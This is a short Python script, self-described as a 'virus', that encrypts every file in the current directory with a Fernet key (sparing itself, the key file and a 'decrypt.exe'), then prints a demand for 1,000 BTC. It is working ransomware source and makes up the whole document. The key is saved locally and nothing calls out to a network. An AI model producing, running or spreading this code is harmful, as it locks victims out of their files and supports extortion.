#Let us do this virus
from cryptography.fernet import Fernet
import os
#list of files to be encrypted
files = []
#go through all the files in the directory and make sure we dont encrpy the .key or decrypt files
for  file in os.listdir():
	if file == "voldemort.py"or file =="thekey.key" or file =="decrypt.exe":
		continue
	if os.path.isfile(file):
		
		files.append(file)

key = Fernet.generate_key()
with open("thekey.key","wb") as thekey:
	thekey.write(key)
for file in files:
	with open(file,"rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open (file,"wb") as thefile:
		thefile.write(contents_encrypted)
		
		
		
print("All of your files have been succesfully encrypted. Send me 1,000 BTC")

